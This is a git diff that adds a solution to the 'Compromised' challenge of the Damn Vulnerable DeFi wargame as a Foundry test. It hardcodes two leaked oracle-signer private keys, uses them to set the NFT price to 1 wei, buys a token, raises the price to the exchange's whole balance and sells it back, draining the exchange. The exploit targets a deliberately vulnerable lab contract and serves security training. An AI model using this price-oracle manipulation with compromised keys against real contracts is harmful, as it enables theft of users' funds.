@@ -18,6 +18,11 @@ contract Compromised is Test {
     DamnValuableNFT internal damnValuableNFT;
     address payable internal attacker;
 
+    uint256[2] internal leakedKeys = [
+        0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9,
+        0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+    ];
+
     function setUp() public {
         address[] memory sources = new address[](3);
 
@@ -77,8 +82,41 @@ contract Compromised is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // Note: https://web3js.readthedocs.io/en/v1.2.11/web3-eth-accounts.html
+        // Private keys are 32 bytes long and are represented by 64 hex characters
+
+        setPrice(1);
+        assertEq(trustfulOracle.getMedianPrice("DVNFT"), 1);
+
+        vm.startPrank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+        vm.stopPrank();
+
+        setPrice(EXCHANGE_INITIAL_ETH_BALANCE + 1);
+        assertEq(
+            trustfulOracle.getMedianPrice("DVNFT"),
+            EXCHANGE_INITIAL_ETH_BALANCE + 1
+        );
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        setPrice(INITIAL_NFT_PRICE);
+        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
+
         /** EXPLOIT END **/
         validation();
+    }
+
+    function setPrice(uint256 price) internal {
+        for (uint8 i = 0; i < leakedKeys.length; i++) {
+            address compromised = vm.addr(leakedKeys[i]);
+            vm.startBroadcast(compromised);
+            trustfulOracle.postPrice("DVNFT", price);
+            vm.stopBroadcast();
+        }
     }
 
     function validation() internal {
